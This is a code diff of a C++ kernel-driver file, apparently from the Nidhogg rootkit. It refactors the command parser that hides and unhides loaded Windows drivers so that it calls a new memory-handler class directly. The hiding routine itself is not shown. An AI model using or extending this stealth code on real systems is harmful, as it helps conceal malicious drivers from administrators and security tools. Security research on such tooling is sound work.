@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "DriverParser.h"
-#include "MemoryUtils.h"
+#include "MemoryHandler.h"
 
 DriverParser::DriverParser() {
 	this->optionsSize = 2;
@@ -27,7 +27,6 @@ DriverParser::DriverParser() {
 NTSTATUS DriverParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	UNICODE_STRING wDriverName = { 0 };
 	ANSI_STRING aDriverName = { 0 };
-	HiddenDriverInformation hiddenDriver{};
 	NTSTATUS status = STATUS_SUCCESS;
 
 	// Converting string to unicode.
@@ -37,29 +36,15 @@ NTSTATUS DriverParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	if (!NT_SUCCESS(status))
 		return status;
 
-	hiddenDriver.DriverName = wDriverName.Buffer;
-
 	switch (commandId) {
 	case Options::Hide:
 	{
-		hiddenDriver.Hide = true;
-
-		if (NidhoggMemoryUtils->GetHiddenDrivers() == MAX_HIDDEN_DRIVERS) {
-			status = STATUS_TOO_MANY_CONTEXT_IDS;
-			break;
-		}
-
-		status = NidhoggMemoryUtils->HideDriver(&hiddenDriver);
+		status = NidhoggMemoryHandler->HideDriver(wDriverName.Buffer);
 		break;
 	}
 	case Options::Unhide:
 	{
-		hiddenDriver.Hide = false;
-
-		if (NidhoggMemoryUtils->GetHiddenDrivers() == 0)
-			break;
-
-		status = NidhoggMemoryUtils->UnhideDriver(&hiddenDriver);
+		status = NidhoggMemoryHandler->UnhideDriver(wDriverName.Buffer);
 		break;
 	}
 	default:
